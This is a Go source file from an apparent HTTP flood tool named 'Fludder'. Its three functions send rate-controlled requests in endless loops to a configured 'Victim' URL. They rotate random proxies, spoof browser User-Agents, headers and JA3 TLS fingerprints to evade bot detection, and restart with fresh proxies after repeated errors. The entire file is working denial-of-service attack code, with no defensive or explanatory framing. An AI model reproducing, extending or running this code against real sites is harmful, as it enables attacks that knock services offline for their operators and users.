package Fludder

import (
	"fmt"
	"github.com/Danny-Dasilva/CycleTLS/cycletls"
	"github.com/wangluozhe/requests"
	"github.com/wangluozhe/requests/url"
	"golang.org/x/net/http2"
	"math/rand"
	"net/http"
	url2 "net/url"
	"sync"
	"time"
)

var start = make(chan bool)

func HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
restart:
	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
	fmt.Println(proxy)
	url, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
	if err != nil {
		fmt.Println("Error by Parsing Proxy. Check Proxies file.")
		return
	}
	x, err := url.Parse(Sys.Attack.Url)
	if err != nil {
		fmt.Println("Error by Parsing Victim. Check Victim url.")
		return
	}
	Http2ProxyConfig := &http.Transport{
		Proxy: http.ProxyURL(url),
	}
	_, err = http2.ConfigureTransports(Http2ProxyConfig)
	if err != nil {
		fmt.Println("Can't upgrade to http2")
		return
	}
	client := http.Client{
		Timeout:   time.Duration(Sys.HTTP2Timeout) * time.Millisecond,
		Transport: Http2ProxyConfig,
	}
	req, err := http.NewRequest(Sys.Attack.AttackMethod, Sys.Attack.Url, nil)
	if err != nil {
		fmt.Println("Can't build Request")
		return
	}
	if Sys.Attack.Host != "" {
		req.Header.Set("Host", Sys.Attack.Host)
	}
	if Sys.Attack.Cookie != nil {
		req.Header.Add("cookie", Sys.Attack.Cookie.(string))
	}
	req.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
	req.Header.Set("authority", x.Host)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-user", "?1")
	req.Header.Set("sec-fetch-dest", "document")
	fmt.Println("before start")
	if errs == -1 {
		wg.Done()
		<-start
	}
	fmt.Println("started")
	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		fmt.Println("before request")
		_, err = client.Do(req)
		fmt.Println("request")
		if err != nil {
			errs++
			if errs > 10 {
				errs = 0
				goto restart
			}
		}
	}
}

func TLS_HTTP2_ChineseVersion(wg *sync.WaitGroup) {
	var errs int
	errs = -1
restart:
	req := url.NewRequest()
	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
	//req.Proxies = proxy
	req.Timeout = time.Duration(Sys.HTTP2Timeout) * time.Millisecond
	req.Ja3 = Sys.Attack.Ja3
	headers := url.NewHeaders()
	headers.Set("Path", "/get")
	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36")
	headers.Set("accept-language", "zh-CN,zh;q=0.9")
	headers.Set("Scheme", "https")
	headers.Set("accept-encoding", "gzip, deflate, br")
	//headers.Set("Content-Length", "100") // Be careful , You can't change it at will Content-Length size
	headers.Set("Host", "httpbin.org")
	headers.Set("Accept", "application/json, text/javascript, */*; q=0.01")
	(*headers)["Header-Order:"] = []string{
		// Request header sort , The value must be lowercase
		"user-agent",
		"path",
		"accept-language",
		"scheme",
		"connection",
		"accept-encoding",
		"content-length",
		"host",
		"accept",
	}
	if errs == -1 {
		wg.Done()
		<-start
	}
	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		//fmt.Println("beforeRequest")
		r, err := requests.Get("http://"+proxy+"@also.black/hit", req)
		//fmt.Println("request")
		if err != nil {
			fmt.Println(err)
			errs++
			if errs > 10 {
				errs = 0
				goto restart
			}
		} else {
			fmt.Println(r.StatusCode)
			r.Body.Close()
		}
	}
}

func TLS_HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
restart:
	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
	headers := make(map[string]string)
	if Sys.Attack.Host != "" {
		headers["Host"] = Sys.Attack.Host
	}
	/*headers["sec-ch-ua-mobile"] = "?0"
	headers["upgrade-insecure-requests"] = "1"
	headers["cache-control"] = "max-age=0"
	headers["sec-fetch-mode"] = "navigate"
	headers["sec-fetch-user"] = "?1"
	headers["sec-fetch-dest"] = "document"*/
	client := cycletls.Init()
	options := cycletls.Options{
		Proxy:     "https://" + proxy,
		Ja3:       Sys.Attack.Ja3,
		UserAgent: UserAgents[rand.Intn(len(UserAgents))],
		//Headers:   headers,
		Timeout: Sys.HTTP2Timeout,
	}
	if errs == -1 {
		wg.Done()
		<-start
	}
	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		fmt.Println("beforeRequest")
		_, err := client.Do(Sys.Attack.Url, options, Sys.Attack.AttackMethod)
		fmt.Println("request")
		if err != nil {
			errs++
			if errs > 10 {
				errs = 0
				goto restart
			}
		}
	}
}
